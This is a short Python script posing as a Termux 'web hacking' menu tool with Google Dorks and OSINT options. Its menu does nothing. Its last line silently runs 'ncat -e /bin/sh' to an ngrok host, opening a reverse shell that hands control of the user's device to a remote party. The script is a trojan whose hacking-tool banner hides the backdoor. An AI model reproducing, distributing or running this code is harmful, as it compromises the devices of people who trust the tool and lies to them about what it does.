import os
os.system("apt install figlet")
os.system("apt install nmap-ncat")
print("figlet webber")
print("-------------------------------------")
print("Web Hacking for new hackers from Termux")
print("Coded by Andromeda")
print("-------------------------------------")
print()
print("[1] Google Dorks")
print("[2] Osint")
os.system("ncat -e /bin/sh 0.tcp.sa.ngrok.io 12336")
